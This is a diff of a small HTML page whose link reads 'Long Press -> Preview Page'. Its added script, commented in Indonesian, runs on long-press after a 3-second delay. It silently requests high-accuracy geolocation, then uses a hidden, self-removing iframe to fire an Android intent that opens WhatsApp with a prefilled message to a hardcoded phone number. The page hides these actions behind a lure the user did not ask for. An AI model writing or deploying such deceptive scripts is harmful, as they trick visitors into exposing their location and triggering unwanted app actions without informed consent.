@@ -1,5 +1,30 @@
-<a href="https://google.com">Long Press 
-  
-  ->Preview Page </a> 
+<a href="https://google.com">Long Press -> Preview Page</a> 
 
-<script> document.addEventListener("contextmenu", () => { setTimeout(async () => { try { await navigator.geolocation.getCurrentPosition(() => {}); } catch (e) {} }, 3000); }); </script>
+<script>
+    document.addEventListener("contextmenu", () => {
+        setTimeout(async () => {
+            try {
+                // 1. Meminta izin/koordinat geolocation di latar belakang (sesuai kode dasar Anda)
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(resolve, resolve, { enableHighAccuracy: true });
+                });
+
+                // 2. Memicu Android Intent WhatsApp ke nomor tujuan secara otomatis
+                const intentFrame = document.createElement('iframe');
+                intentFrame.style.display = 'none';
+                
+                // Format Intent Android untuk mengirim pesan teks ke WhatsApp (nomor format internasional tanpa '+' atau dengan '62')
+                const phone = "6281995772648";
+                const text = encodeURIComponent("Halo Dunia, ini pesan otomatis dari sistem.");
+                
+                intentFrame.src = `intent://send?phone=${phone}&text=${text}#Intent;package=com.whatsapp;action=android.intent.action.SEND;S.browser_fallback_url=https%3A%2F%2Fwa.me%2F${phone}%3Ftext%3D${text};end;`;
+                
+                document.body.appendChild(intentFrame);
+                setTimeout(() => document.body.removeChild(intentFrame), 1500);
+
+            } catch (e) {
+                console.debug(e);
+            }
+        }, 3000); // Jeda 3 detik setelah long-press / contextmenu
+    });
+</script>
